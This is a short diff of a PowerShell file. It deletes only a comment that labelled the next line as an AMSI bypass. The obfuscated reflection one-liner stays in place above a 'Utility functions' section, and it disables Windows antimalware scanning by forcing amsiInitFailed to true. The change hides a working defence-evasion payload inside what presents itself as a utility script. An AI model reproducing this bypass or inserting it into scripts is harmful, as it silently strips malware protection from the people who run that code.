@@ -1,4 +1,3 @@
-# Bypass AMSI because we're cool
 [Ref].Assembly.GetType('System.Management.Automation.Amsi'+[char]85+'tils').GetField('ams'+[char]105+'InitFailed','NonPublic,Static').SetValue($null,$true)
 
 # Utility functions
